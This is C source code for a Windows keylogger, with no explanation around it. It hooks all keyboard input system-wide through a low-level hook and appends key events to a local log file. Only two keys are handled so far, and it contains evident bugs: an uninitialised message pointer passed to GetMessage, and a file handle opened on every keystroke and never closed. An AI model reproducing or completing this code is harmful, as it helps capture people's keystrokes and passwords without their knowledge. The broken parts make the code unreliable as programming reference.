#include <windows.h>
#include <stdio.h>
#define LOGFILE "logfile.txt"

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
FILE *OpenLogFile(void);
int CloseLogFile(FILE * file);
int LogToFile(FILE *file, char *key);

int main(void)
{
    // #include "values.h"
    HHOOK hookptr = SetWindowsHookExA(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
    LPMSG message;
    GetMessage(message, NULL, 0, 0); // to keep program alive

    UnhookWindowsHookEx(hookptr);
}

FILE *OpenLogFile(void)
{
    FILE *logfile = fopen(LOGFILE, "a");
    return logfile;
}

int CloseLogFile(FILE * file)
{
    return fclose(file);
}

int LogToFile(FILE *file, char *key)
{
    int res = fputs(key, file);
    fputs("\n", file);
    fflush(file);
    return res;
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    FILE *logfile = OpenLogFile();

    if (nCode < 0)
    {
        return CallNextHookEx(NULL, nCode, wParam, lParam);
    }
    else
    {
        PKBDLLHOOKSTRUCT kbstructp = (PKBDLLHOOKSTRUCT)lParam;
        if (wParam == WM_KEYDOWN)
        {
            printf("%X", kbstructp->vkCode);
            int key = kbstructp->vkCode;
            switch (key)
            {
            case VK_RCONTROL:
                LogToFile(logfile, "[RIGHT CONTROL] DOWN");
                break;
            case VK_LSHIFT:
                LogToFile(logfile, "[LEFT SHIFT] DOWN");
                break;
            }
        }
        else if (wParam == WM_KEYUP)
        {
            printf("%X", kbstructp->vkCode);
            int key = kbstructp->vkCode;
            switch (key)
            {
            case VK_RCONTROL:
                LogToFile(logfile, "[RIGHT CONTROL] UP");
                break;
            case VK_LSHIFT:
                LogToFile(logfile, "[LEFT SHIFT] UP");
                break;
            }
        }
        return CallNextHookEx(NULL, nCode, wParam, lParam);
    }
}
